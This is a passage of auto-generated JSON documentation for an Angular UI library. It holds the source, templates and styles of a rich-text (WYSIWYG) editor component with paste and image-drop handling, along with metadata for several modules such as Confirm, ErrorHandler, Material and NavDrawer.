{\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    this.listenForSelectEvents();\r\n  }\r\n\r\n  ngOnDestroy(): void {\r\n    this.destroyed$.next(true);\r\n    this.destroyed$.complete();\r\n  }\r\n\r\n  private listenForSelectEvents() {\r\n    merge(\r\n      fromEvent(this.editor.nativeElement, 'mouseup'),\r\n      fromEvent<KeyboardEvent>(this.editor.nativeElement, 'keyup')\r\n        .pipe(\r\n          filter((ev) => ( ev.ctrlKey && ev.key === 'A' ) || ( /Arrow/.test(ev.key) ))\r\n        )\r\n    ).pipe(debounceTime(200), takeUntil(this.destroyed$))\r\n      .subscribe(() => {\r\n        this.active = Modifiers.getActiveModifiers();\r\n        this.cdr.detectChanges();\r\n      });\r\n  }\r\n\r\n  execute(method: string) {\r\n    if ( !validCommands.includes(method) ) {\r\n      return;\r\n    }\r\n    const showUi = method === 'createLink';\r\n    if ( showUi ) {\r\n      const url = window.prompt('url');\r\n      if ( url ) {\r\n        document.execCommand(method, false, url);\r\n      }\r\n    } else {\r\n      document.execCommand(method, false, '');\r\n    }\r\n    this.active = Modifiers.getActiveModifiers();\r\n    this.cdr.detectChanges();\r\n  }\r\n\r\n  onKeyDownHandleTab(event: KeyboardEvent) {\r\n    if ( event.key === 'Tab' ) {\r\n      event.preventDefault();\r\n      let method: string;\r\n      if ( event.shiftKey ) {\r\n        method = 'outdent';\r\n      } else {\r\n        method = 'indent';\r\n      }\r\n      this.execute(method);\r\n    }\r\n  }\r\n\r\n  writeValue(value: string): void {\r\n    if ( value ) {\r\n      const sanitized = this.domSanitizer.sanitize(SecurityContext.HTML, value) ?? '';\r\n      this.value = this.domSanitizer.bypassSecurityTrustHtml(sanitized);\r\n      this.cdr.detectChanges();\r\n    }\r\n  }\r\n  // eslint-disable-next-line\r\n  propagateChange = (value: unknown) => {\r\n    console.log(value); // To remove eslint warning..\r\n  };\r\n\r\n  registerOnChange(fn: never): void {\r\n    this.propagateChange = fn;\r\n  }\r\n\r\n  registerOnTouched(fn: unknown): void {\r\n    this.onTouched = fn;\r\n  }\r\n\r\n  setDisabledState(isDisabled: boolean): void {\r\n    this.disabled = isDisabled;\r\n    this.cdr.detectChanges();\r\n  }\r\n\r\n  valueChanged(value: string) {\r\n    this.propagateChange(value);\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": ".sto-wysiwyg {\r\n  .mat-button-toggle-appearance-standard .mat-button-toggle-label-content {\r\n    line-height: 36px;\r\n    padding: 0 6px;\r\n  }\r\n\r\n  &__editor {\r\n    &__button {\r\n      min-width: 40px;\r\n      width: 40px;\r\n      padding: 0;\r\n    }\r\n  }\r\n\r\n  &__actions {\r\n    display: flex;\r\n    justify-content: space-between;\r\n    align-items: flex-end;\r\n    flex-wrap: wrap;\r\n    min-height: 44px;\r\n    padding-bottom: 2px;\r\n\r\n    .divider {\r\n      height: 36px;\r\n      width: 0;\r\n      margin: 0 4px;\r\n    }\r\n\r\n    .mat-button-toggle-group {\r\n      border: none;\r\n\r\n      .mat-button-toggle {\r\n        border-left: none;\r\n        margin-left: 2px;\r\n\r\n        &:first-of-type {\r\n          margin-left: 0;\r\n        }\r\n      }\r\n    }\r\n  }\r\n\r\n\r\n  min-height: 100px;\r\n  max-height: 100%;\r\n  overflow: hidden;\r\n  height: 100%;\r\n  border-radius: 2px;\r\n  padding: 4px 0 8px;\r\n  display: flex;\r\n  flex-direction: column;\r\n\r\n  &__buttons {\r\n    flex: 1 1 auto;\r\n    display: flex;\r\n    justify-content: flex-start;\r\n  }\r\n\r\n  &__actions {\r\n    .user-buttons {\r\n      button {\r\n        margin: 8px 4px 0;\r\n      }\r\n    }\r\n  }\r\n\r\n  &__editor {\r\n\r\n    transition: border-color 300ms ease, background-color 200ms ease, height 200ms ease;\r\n    border-radius: 2px;\r\n    outline: none;\r\n    margin-top: 4px;\r\n    padding: 12px 4px 4px;\r\n    flex: 1 1 auto;\r\n    line-height: 18px;\r\n    overflow: auto;\r\n\r\n    &--readonly {\r\n      background: transparent;\r\n      border-width: 0;\r\n    }\r\n\r\n    p {\r\n      margin-bottom: 0;\r\n    }\r\n  }\r\n}\r\n",
            "styleUrl": "./wysiwyg.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "domSanitizer",
              "type": "DomSanitizer",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "zone",
              "type": "NgZone",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 45,
          "jsdoctags": [
            {
              "name": "domSanitizer",
              "type": "DomSanitizer",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "zone",
              "type": "NgZone",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "AfterViewInit",
          "OnDestroy",
          "ControlValueAccessor"
        ],
        "templateData": "<div class=\"sto-wysiwyg\">\r\n  <sto-wysiwyg-actions [active]=\"active\"\r\n                       [disabled]=\"disabled\"\r\n                       (modifier)=\"execute($event)\">\r\n    <ng-content></ng-content>\r\n  </sto-wysiwyg-actions>\r\n  <sto-wysiwyg-editor [readonly]=\"disabled\"\r\n                      [content]=\"value\"\r\n                      (valueChanged)=\"valueChanged($event)\"\r\n                      (keydown)=\"onKeyDownHandleTab($event)\"></sto-wysiwyg-editor>\r\n</div>\r\n"
      },
      {
        "name": "WysiwygEditorComponent",
        "id": "component-WysiwygEditorComponent-60935fe964f2503d3fb08634039b04e9faf78d5bb6f21408a20bd39a5c4ac5be1feb3de6ad508f044a3bc534bd6826b505ed44c0ce8a81c479566f57a9a37b10",
        "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg-editor/wysiwyg-editor.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-wysiwyg-editor",
        "styleUrls": [
          "./wysiwyg-editor.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./wysiwyg-editor.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "content",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 13,
            "type": "SafeHtml",
            "decorators": []
          },
          {
            "name": "readonly",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 15,
            "type": "boolean",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "valueChanged",
            "defaultValue": "new EventEmitter<string>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 19,
            "type": "EventEmitter"
          }
        ],
            "propertiesClass": [
              {
                "name": "destroyed$",
                "defaultValue": "new Subject<boolean>()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 22,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "editor",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ElementRef<HTMLDivElement>",
                "optional": false,
                "description": "",
                "line": 17,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "'editor'"
                  }
                ]
              },
              {
                "name": "warning",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string | null",
                "optional": false,
                "description": "",
                "line": 20,
                "modifierKind": [
                  123
                ]
              }
            ],
            "methodsClass": [
              {
                "name": "insertImage",
                "args": [
                  {
                    "name": "img",
                    "type": "File",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 104,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": "img",
                    "type": "File",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "listenForValueChange",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 37,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "ngAfterViewInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 33,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnDestroy",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 28,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "onDrop",
                "args": [
                  {
                    "name": "event",
                    "type": "DragEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 134,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "DragEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "onPaste",
                "args": [
                  {
                    "name": "event",
                    "type": "ClipboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 48,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "ClipboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "pasteText",
                "args": [
                  {
                    "name": "event",
                    "type": "ClipboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 64,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "ClipboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "stripImageSection",
                "args": [
                  {
                    "name": "html",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "any",
                "typeParameters": [],
                "line": 89,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": "html",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { AfterViewInit, Component, ElementRef, EventEmitter, Input, NgZone, OnDestroy, Output, ViewChild } from '@angular/core';\r\nimport { SafeHtml } from '@angular/platform-browser';\r\nimport { fromEvent, Subject } from 'rxjs';\r\nimport { debounceTime, takeUntil } from 'rxjs/operators';\r\n\r\n@Component({\r\n  selector: 'sto-wysiwyg-editor',\r\n  templateUrl: './wysiwyg-editor.component.html',\r\n  styleUrls: [ './wysiwyg-editor.component.scss' ]\r\n})\r\nexport class WysiwygEditorComponent implements AfterViewInit, OnDestroy {\r\n  @Input()\r\n  content: SafeHtml;\r\n  @Input()\r\n  readonly: boolean;\r\n  @ViewChild('editor')\r\n  editor: ElementRef<HTMLDivElement>;\r\n  @Output()\r\n  valueChanged = new EventEmitter<string>();\r\n  public warning: string | null;\r\n\r\n  private destroyed$ = new Subject<boolean>();\r\n\r\n  constructor(private zone: NgZone) {\r\n  }\r\n\r\n\r\n  ngOnDestroy(): void {\r\n    this.destroyed$.next(true);\r\n    this.destroyed$.complete();\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    this.listenForValueChange();\r\n  }\r\n\r\n  private listenForValueChange() {\r\n    fromEvent(this.editor.nativeElement, 'input')\r\n      .pipe(\r\n        debounceTime(100),\r\n        takeUntil(this.destroyed$)\r\n      ).subscribe(ev => {\r\n      this.warning = null;\r\n      this.valueChanged.emit(( ev.target as HTMLElement ).innerHTML);\r\n    });\r\n  }\r\n\r\n  onPaste(event: ClipboardEvent) {\r\n    if ( this.readonly ) {\r\n      return;\r\n    }\r\n    if (!event.clipboardData) {\r\n      return;\r\n    }\r\n    const img = event.clipboardData.files.item(0);\r\n    if ( !!img && img.type.includes('image') ) {\r\n      // event.preventDefault();\r\n      this.insertImage(img);\r\n    } else if ( !img ) {\r\n      this.pasteText(event);\r\n    }\r\n  }\r\n\r\n  private pasteText(event: ClipboardEvent) {\r\n    if (!event.clipboardData) {\r\n      return;\r\n    }\r\n    const html = event.clipboardData.getData('text/html');\r\n    const hasImage: boolean = /<img/.test(html);\r\n    if ( hasImage ) {\r\n      event.preventDefault();\r\n      this.warning = `Some images were not included due to browser security around mixed content. Try to paste the image separately.`;\r\n      const stripped = this.stripImageSection(html);\r\n      const el = document.createElement('div');\r\n      el.innerHTML = stripped;\r\n      const sel = document.getSelection();\r\n      if (!sel) {\r\n        return;\r\n      }\r\n      const range = sel.getRangeAt(0);\r\n      range.deleteContents();\r\n      range.insertNode(el);\r\n      sel.removeAllRanges();\r\n      range.collapse();\r\n      sel.addRange(range);\r\n    }\r\n  }\r\n\r\n  private stripImageSection(html: string) {\r\n    const div = document.createElement('div');\r\n    div.innerHTML = html;\r\n    const images = div.querySelectorAll('img');\r\n    Array.from(images)\r\n      .forEach(image => {\r\n        let el = image as HTMLElement;\r\n        while ( el.parentElement && el.parentElement !== div ) {\r\n          el = el.parentElement;\r\n        }\r\n        div.removeChild(el);\r\n      });\r\n    return div.innerHTML;\r\n  }\r\n\r\n  private insertImage(img: File) {\r\n    const fr = new FileReader();\r\n    fr.onloadend = (loadEvent) => {\r\n      this.zone.runOutsideAngular(() => {\r\n        const res = ( loadEvent.currentTarget as FileReader ).result as string;\r\n        const el = document.createElement('img');\r\n        el.title = `${img.name}`;\r\n        el.src = res;\r\n        el.style.maxHeight = '300px';\r\n        const sel = document.getSelection();\r\n        if (!sel) {\r\n          return;\r\n        }\r\n        const range = sel.getRangeAt(0);\r\n        const cont = range.endContainer;\r\n        if ( !this.editor.nativeElement.contains(cont) ) {\r\n          range.setStart(this.editor.nativeElement, 0);\r\n        }\r\n        range.deleteContents();\r\n        range.insertNode(el);\r\n        sel.removeAllRanges();\r\n        range.collapse();\r\n        sel.addRange(range);\r\n        this.valueChanged.emit(this.editor.nativeElement.innerHTML);\r\n        this.warning = null;\r\n      });\r\n    };\r\n    fr.readAsDataURL(img);\r\n  }\r\n\r\n  onDrop(event: DragEvent) {\r\n    if ( this.readonly || !event.dataTransfer ) {\r\n      return;\r\n    }\r\n    if ( event.dataTransfer.types.includes('Files') ) {\r\n      event.preventDefault();\r\n      const img = event.dataTransfer.files.item(0);\r\n      if (img) {\r\n        this.insertImage(img);\r\n      }\r\n    }\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": ":host {\r\n  display: contents;\r\n}\r\n",
            "styleUrl": "./wysiwyg-editor.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "zone",
              "type": "NgZone",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 22,
          "jsdoctags": [
            {
              "name": "zone",
              "type": "NgZone",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "AfterViewInit",
          "OnDestroy"
        ],
        "templateData": "<div class=\"sto-wysiwyg__editor\"\r\n     (dragover)=\"$event.preventDefault(); $event.stopPropagation();\"\r\n     (drop)=\"onDrop($event)\"\r\n     [class.sto-wysiwyg__editor--readonly]=\"readonly\"\r\n     [innerHTML]=\"content\"\r\n     (paste)=\"onPaste($event)\"\r\n     #editor\r\n     [attr.contenteditable]=\"!readonly\"></div>\r\n<span class=\"error\"\r\n      *ngIf=\"warning\">{{ warning }}</span>\r\n"
      }
    ],
    "modules": [
      {
        "name": "AppModule",
        "id": "module-AppModule-fcaa0754f3fddc1844a916c33c5251f3f461f1352ea557904bedd8b2de8f302e0c96b9bdc32fff42d4e8f1fa612e15c49625f675bb069b1bbbc511115be58dc0",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "apps/oilmod-web/src/app/app.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { BrowserModule } from '@angular/platform-browser';\r\n\r\nimport { AppComponent } from './app.component';\r\n\r\n@NgModule({\r\n  declarations: [AppComponent],\r\n  imports: [BrowserModule],\r\n  providers: [],\r\n  bootstrap: [AppComponent],\r\n})\r\nexport class AppModule {}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "AppComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": []
          },
          {
            "type": "bootstrap",
            "elements": [
              {
                "name": "AppComponent"
              }
            ]
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "ConfirmerModule",
        "id": "module-ConfirmerModule-78d80ddef6f2b936ff31947848334586bf1b936c1ea8620f277e511493ed12aa11520f547ca1c421e9ab357806583197fbdfcf1683d8e1d0b26bf8f7ffe55441",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
        "methods": [],
        "sourceCode": "import { Meta, Story } from '@storybook/angular/types-6-0';\r\nimport { moduleMetadata } from '@storybook/angular';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { BrowserAnimationsModule } from '@angular/platform-browser/animations';\r\n// @ts-ignore\r\nimport { Component, NgModule } from '@angular/core';\r\nimport { ConfirmModule, ConfirmService } from '@ngx-stoui/common';\r\n\r\n@Component({\r\n  selector: 'app-confirm-demo',\r\n  template: `\r\n    <button (click)=\"show()\"\r\n            mat-button>Show confirm\r\n    </button>\r\n  `,\r\n\r\n})\r\nclass ConfirmDemoComponent {\r\n  show() {\r\n    this.confirm.confirm('Confirmation message should be short', 'Confirm delete', 'Delete');\r\n  }\r\n\r\n  constructor(private confirm: ConfirmService) {\r\n  }\r\n}\r\n\r\n@NgModule({\r\n  declarations: [ConfirmDemoComponent],\r\n  exports: [ConfirmDemoComponent],\r\n})\r\nclass ConfirmerModule {}\r\n\r\nexport default {\r\n  title: 'common/Confirm Service',\r\n  decorators: [\r\n    moduleMetadata({\r\n      imports: [\r\n        ConfirmModule, ConfirmerModule, BrowserAnimationsModule, MatButtonModule ],\r\n      declarations: [  ],\r\n    })\r\n  ],\r\n  parameters: {\r\n  },\r\n} as Meta;\r\n\r\n\r\nexport const Usage: Story<ConfirmDemoComponent> = (args: ConfirmDemoComponent) => {\r\n  return {\r\n    component: ConfirmDemoComponent,\r\n    props: args,\r\n    template: '<app-confirm-demo></app-confirm-demo>'\r\n  };\r\n};\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "ConfirmDemoComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "ConfirmDemoComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "ConfirmModule",
        "id": "module-ConfirmModule-73ce26cf95efa483a4a31744b2378589ef725e137ebdfa83a7706f5044b534ab16be57d64eeb8717418c7220fb3da74613c8aeefd01efa7ed33c78c1118d4d6c",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { MatDialogModule } from '@angular/material/dialog';\r\nimport { ConfirmService } from './sto-confirm-dialog.service';\r\nimport { ConfirmComponent } from './sto-confirm-dialog.component';\r\n\r\n\r\n@NgModule({\r\n  declarations: [\r\n    ConfirmComponent\r\n  ],\r\n  imports: [\r\n    CommonModule,\r\n    MatDialogModule,\r\n    MatButtonModule\r\n  ],\r\n  providers: [\r\n    ConfirmService\r\n  ],\r\n  entryComponents: [\r\n    ConfirmComponent\r\n  ]\r\n})\r\nexport class ConfirmModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": [
              {
                "name": "ConfirmService"
              }
            ]
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "ConfirmComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": []
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "ErrorHandlerModule",
        "id": "module-ErrorHandlerModule-b59d7630583afdb65c57238b4daa5f5ffb7a31246f1e6c6998328e0542f71d4106025b18b8aaa0b68ed30f94a2667fa1f0ae18a1a31a8bed283405e6d61bf7fe",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/error-handler/src/lib/error-handler/error-handler.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { MatDialogModule } from '@angular/material/dialog';\r\nimport { ErrorDialogService } from './error-dialog.service';\r\nimport { ErrorHandlerService } from './error-handler.service';\r\nimport { DialogComponent } from './dialog/dialog.component';\r\nimport { MatButtonModule } from '@angular/material/button';\r\n\r\n@NgModule({\r\n  declarations: [ DialogComponent ],\r\n  imports: [\r\n    CommonModule,\r\n    MatDialogModule,\r\n    MatButtonModule\r\n  ],\r\n  providers: [\r\n    ErrorHandlerService,\r\n    ErrorDialogService\r\n  ],\r\n  entryComponents: [ DialogComponent ],\r\n})\r\nexport class ErrorHandlerModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": [
              {
                "name": "ErrorDialogService"
              },
              {
                "name": "ErrorHandlerService"
              }
            ]
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "DialogComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": []
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "MaterialModule",
        "id": "module-MaterialModule-89e61e7448114f17fb4b21035e9454aa1c93dcdbf5097a242d98bf37fcb055957a8c21a9fe4ec6fba3a962add4ea3880f5d3401ce58ef262aba6278e0f3323ce",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/testing/src/lib/material.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { MatAutocompleteModule } from '@angular/material/autocomplete';\r\nimport { MatBadgeModule } from '@angular/material/badge';\r\nimport { MatBottomSheetModule } from '@angular/material/bottom-sheet';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { MatButtonToggleModule } from '@angular/material/button-toggle';\r\nimport { MatCardModule } from '@angular/material/card';\r\nimport { MatCheckboxModule } from '@angular/material/checkbox';\r\nimport { MatChipsModule } from '@angular/material/chips';\r\nimport { MatNativeDateModule, MatRippleModule } from '@angular/material/core';\r\nimport { MatDatepickerModule } from '@angular/material/datepicker';\r\nimport { MatDialogModule } from '@angular/material/dialog';\r\nimport { MatDividerModule } from '@angular/material/divider';\r\nimport { MatExpansionModule } from '@angular/material/expansion';\r\nimport { MatFormFieldModule } from '@angular/material/form-field';\r\nimport { MatGridListModule } from '@angular/material/grid-list';\r\nimport { MatIconModule } from '@angular/material/icon';\r\nimport { MatInputModule } from '@angular/material/input';\r\nimport { MatListModule } from '@angular/material/list';\r\nimport { MatMenuModule } from '@angular/material/menu';\r\nimport { MatPaginatorModule } from '@angular/material/paginator';\r\nimport { MatProgressBarModule } from '@angular/material/progress-bar';\r\nimport { MatProgressSpinnerModule } from '@angular/material/progress-spinner';\r\nimport { MatRadioModule } from '@angular/material/radio';\r\nimport { MatSelectModule } from '@angular/material/select';\r\nimport { MatSidenavModule } from '@angular/material/sidenav';\r\nimport { MatSlideToggleModule } from '@angular/material/slide-toggle';\r\nimport { MatSliderModule } from '@angular/material/slider';\r\nimport { MatSnackBarModule } from '@angular/material/snack-bar';\r\nimport { MatSortModule } from '@angular/material/sort';\r\nimport { MatStepperModule } from '@angular/material/stepper';\r\nimport { MatTableModule } from '@angular/material/table';\r\nimport { MatTabsModule } from '@angular/material/tabs';\r\nimport { MatToolbarModule } from '@angular/material/toolbar';\r\nimport { MatTooltipModule } from '@angular/material/tooltip';\r\nimport { MatTreeModule } from '@angular/material/tree';\r\nimport { BrowserAnimationsModule } from '@angular/platform-browser/animations';\r\nimport { FormsModule, ReactiveFormsModule } from '@angular/forms';\r\n\r\n@NgModule({\r\n  imports: [\r\n    MatDatepickerModule,\r\n    MatAutocompleteModule,\r\n    MatBadgeModule,\r\n    MatBottomSheetModule,\r\n    MatButtonModule,\r\n    MatButtonToggleModule,\r\n    MatCardModule,\r\n    MatCheckboxModule,\r\n    MatChipsModule,\r\n    MatDialogModule,\r\n    MatDividerModule,\r\n    MatExpansionModule,\r\n    MatFormFieldModule,\r\n    MatGridListModule,\r\n    MatIconModule,\r\n    MatInputModule,\r\n    MatListModule,\r\n    MatMenuModule,\r\n    MatPaginatorModule,\r\n    MatProgressBarModule,\r\n    MatProgressSpinnerModule,\r\n    MatRadioModule,\r\n    MatSelectModule,\r\n    MatSidenavModule,\r\n    MatSlideToggleModule,\r\n    MatSliderModule,\r\n    MatSnackBarModule,\r\n    MatSortModule,\r\n    MatStepperModule,\r\n    MatTableModule,\r\n    MatTabsModule,\r\n    MatToolbarModule,\r\n    MatTooltipModule,\r\n    MatTreeModule,\r\n    BrowserAnimationsModule,\r\n    MatNativeDateModule,\r\n    MatRippleModule\r\n  ],\r\n  exports: [\r\n    MatDatepickerModule,\r\n    MatAutocompleteModule,\r\n    MatBadgeModule,\r\n    MatBottomSheetModule,\r\n    MatButtonModule,\r\n    MatButtonToggleModule,\r\n    MatCardModule,\r\n    MatCheckboxModule,\r\n    MatChipsModule,\r\n    MatDialogModule,\r\n    MatDividerModule,\r\n    MatExpansionModule,\r\n    MatFormFieldModule,\r\n    MatGridListModule,\r\n    MatIconModule,\r\n    MatInputModule,\r\n    MatListModule,\r\n    MatMenuModule,\r\n    MatPaginatorModule,\r\n    MatProgressBarModule,\r\n    MatProgressSpinnerModule,\r\n    MatRadioModule,\r\n    MatSelectModule,\r\n    MatSidenavModule,\r\n    MatSlideToggleModule,\r\n    MatSliderModule,\r\n    MatSnackBarModule,\r\n    MatSortModule,\r\n    MatStepperModule,\r\n    MatTableModule,\r\n    MatTabsModule,\r\n    MatToolbarModule,\r\n    MatTooltipModule,\r\n    MatTreeModule,\r\n    BrowserAnimationsModule,\r\n    MatNativeDateModule,\r\n    FormsModule,\r\n    ReactiveFormsModule,\r\n    MatRippleModule\r\n  ]\r\n})\r\nexport class MaterialModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": []
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": []
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "NavDrawerModule",
        "id": "module-NavDrawerModule-44c0d3cacdeb12366689cd5173118271df8346394255ee91405b5fa3f5c91da9af1e85365a4a3f7456582f47050397a33004ecd33126f5cae13ded65c14aa1f6",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { NavDrawerComponent } from './nav-drawer.component';\r\nimport { NavDrawerItemComponent } from './nav-drawer-item/nav-drawer-item.component';\r\nimport { RouterModule } from '@angular/router';\r\nimport { MatIconModule } from '@angular/material/icon';\r\nimport { NavDrawerListComponent } from './nav-drawer-list/nav-drawer-list.component';\r\nimport { NavDrawerListItemComponent } from './nav-drawer-list-item/nav-drawer-list-item.component';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { MatMenuModule } from '@angular/material/menu';\r\nimport { MatDividerModule } from '@angular/material/divider';\r\nimport { MatRippleModule } from '@angular/material/core';\r\n\r\n@NgModule({\r\n  declarations: [\r\n    NavDrawerComponent,\r\n    NavDrawerItemComponent,\r\n    NavDrawerListComponent,\r\n    NavDrawerListItemComponent,\r\n  ],\r\n  imports: [\r\n    CommonModule,\r\n    RouterModule,\r\n    MatIconModule,\r\n    MatButtonModule,\r\n    MatMenuModule,\r\n    MatDividerModule,\r\n    MatRippleModule\r\n  ],\r\n  exports: [\r\n    NavDrawerComponent,\r\n    NavDrawerItemComponent,\r\n    NavDrawerListComponent,\r\n    NavDrawerListItemComponent,\r\n  ]\r\n})\r\nexport class NavDrawerModule { }\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "NavDrawerComponent"
              },
              {
                "name": "NavDrawerItemComponent"
              },
              {
                "name": "NavDrawerListComponent"
              },
              {
                "name": "NavDrawerListItemComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "NavDrawerComponent"
              },
              {
                "name": "NavDrawerItemComponent"
              },
